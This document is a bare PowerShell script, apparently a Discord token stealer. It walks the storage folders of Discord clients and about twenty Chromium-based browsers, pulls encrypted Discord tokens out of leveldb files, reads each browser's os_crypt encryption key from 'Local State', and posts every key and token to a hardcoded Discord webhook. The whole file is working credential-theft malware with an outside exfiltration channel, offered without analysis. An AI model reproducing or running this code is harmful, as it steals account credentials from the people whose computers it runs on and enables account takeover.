
$LOCAL = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
$ROAMING = [System.Environment]::GetEnvironmentVariable("APPDATA")
$PATHS = @{
    'Discord' = "$ROAMING\discord"
    'Discord Canary' = "$ROAMING\discordcanary"
    'Lightcord' = "$ROAMING\Lightcord"
    'Discord PTB' = "$ROAMING\discordptb"
    'Opera' = "$ROAMING\Opera Software\Opera Stable"
    'Opera GX' = "$ROAMING\Opera Software\Opera GX Stable"
    'Amigo' = "$LOCAL\Amigo\User Data"
    'Torch' = "$LOCAL\Torch\User Data"
    'Kometa' = "$LOCAL\Kometa\User Data"
    'Orbitum' = "$LOCAL\Orbitum\User Data"
    'CentBrowser' = "$LOCAL\CentBrowser\User Data"
    '7Star' = "$LOCAL\7Star\7Star\User Data"
    'Sputnik' = "$LOCAL\Sputnik\Sputnik\User Data"
    'Vivaldi' = "$LOCAL\Vivaldi\User Data\Default"
    'Chrome SxS' = "$LOCAL\Google\Chrome SxS\User Data"
    'Chrome' = "$LOCAL\Google\Chrome\User Data\Default"
    'Epic Privacy Browser' = "$LOCAL\Epic Privacy Browser\User Data"
    'Microsoft Edge' = "$LOCAL\Microsoft\Edge\User Data\Defaul"
    'Uran' = "$LOCAL\uCozMedia\Uran\User Data\Default"
    'Yandex' = "$LOCAL\Yandex\YandexBrowser\User Data\Default"
    'Brave' = "$LOCAL\BraveSoftware\Brave-Browser\User Data\Default"
    'Iridium' = "$LOCAL\Iridium\User Data\Default"
}
$pattern = @"
dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*
"@

function Get-Tokens {
    param($path)
    $tokens = @()
    $path += "\Local Storage\leveldb\"

    if (!(Test-Path $path)) {
        return $tokens
    }

    $files = Get-ChildItem -Path $path
    foreach ($file in $files) {
        if ($file.Name -notlike "*.ldb" -and $file.Name -like "*.log") {
            continue
        }

        try {
            $lines = Get-Content -Path $file.FullName -ErrorAction SilentlyContinue
            foreach ($line in $lines) {
                $matchess = [regex]::Matches($line, $pattern)
                foreach ($match in $matchess) {
                    $tokens += $match.Value
                }
            }
        } catch {
            continue
        }
    }

    return $tokens
}

function Get-Key {
    param($path)
    $localStatePath = Join-Path $path "Local State"
    $jsonContent = Get-Content -Path $localStatePath | Out-String
    $key = ($jsonContent | ConvertFrom-Json).os_crypt.encrypted_key
    return $key
}

foreach ($platform in $PATHS.Keys) {
    $path = $PATHS[$platform]
    if (!(Test-Path $path)) {
        continue
    }
    $tokens = Get-Tokens -path $path
    foreach ($token in $tokens) {
        $token = $token -replace '\\', ''

        try {
            $key = Get-Key -path $path
            
            $body = @{
                content = "key:$key|token:$token|"
            } | ConvertTo-Json
            $webhook = "https://discord.com/api/webhooks/1371450132905721978/q-csTeRzLixW97TxYWPDw7rP2OrcCCirK9d1w-zjhQj4sbjvXQhTzGLc1VGsSnmElPpB#"
            Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'

        } catch {
            continue
        }
    }
}
